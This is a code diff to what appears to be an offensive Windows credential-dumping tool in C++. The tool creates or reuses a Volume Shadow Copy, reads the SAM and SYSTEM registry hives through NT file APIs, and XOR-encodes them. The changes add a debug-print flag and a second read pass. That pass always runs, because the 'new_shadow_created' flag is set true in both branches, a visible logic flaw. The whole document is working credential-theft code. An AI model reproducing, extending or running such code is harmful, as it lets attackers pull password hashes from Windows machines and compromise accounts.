@@ -6,6 +6,7 @@
 #include <vector>
 #include <string>
 #include <algorithm>
+#include <fstream>
 #pragma comment(lib, "vssapi.lib")
 #pragma comment(lib, "ws2_32.lib")
 
@@ -467,7 +468,7 @@ std::vector<BYTE> ReadBytesNT(HANDLE fileHandle) {
 
 
 // Read files
-std::vector<BYTE> read_file(const wchar_t* filePath) {
+std::vector<BYTE> read_file(const wchar_t* filePath, bool printBool) {
     std::vector<BYTE> fileContent;
     
     // Open file
@@ -479,7 +480,7 @@ std::vector<BYTE> read_file(const wchar_t* filePath) {
 
     // Read bytes
     fileContent = ReadBytesNT(fileHandle);
-    if (DEBUG_LEVEL >= 1) {
+    if (DEBUG_LEVEL >= 1 && printBool) {
         printf("[+] Read %zu bytes from %ls\n", fileContent.size(), filePath);
     }
     
@@ -805,9 +806,11 @@ int main(int argc, char* argv[]) {
 
     // Get or create Shadow Copy's Device Object
     std::wstring shadowCopyBasePath;
+    bool new_shadow_created = true;
     if (list_shadows(shadowCopyBasePath)) {
         if (DEBUG_LEVEL >= 1) {
             wprintf(L"[+] Shadow Copy found: %s\n", shadowCopyBasePath.c_str());
+            new_shadow_created = true;
         }
     }
     else {
@@ -833,8 +836,16 @@ int main(int argc, char* argv[]) {
     std::wstring systemPath = L"\\windows\\system32\\config\\system";
     std::wstring fullPathSam = shadowCopyBasePath + samPath;
     std::wstring fullPathSystem = shadowCopyBasePath + systemPath;
-    std::vector<BYTE> SamBytes = read_file(fullPathSam.c_str());
-    std::vector<BYTE> SystemBytes = read_file(fullPathSystem.c_str());
+    std::vector<BYTE> SamBytes = read_file(fullPathSam.c_str(), true);
+    std::vector<BYTE> SystemBytes = read_file(fullPathSystem.c_str(), true);
+  
+    // Second round needed when the Shadow Copy is new (a problem with NtOpenFile I can't solve...) 
+    if (new_shadow_created) {
+        std::vector<BYTE> SamBytes_2 = read_file(fullPathSam.c_str(), false);
+        SamBytes = SamBytes_2;
+        std::vector<BYTE> SystemBytes_2 = read_file(fullPathSystem.c_str(), false);
+        SystemBytes = SystemBytes_2;
+    }
 
     // XOR-Encode
     if (xorencode) {
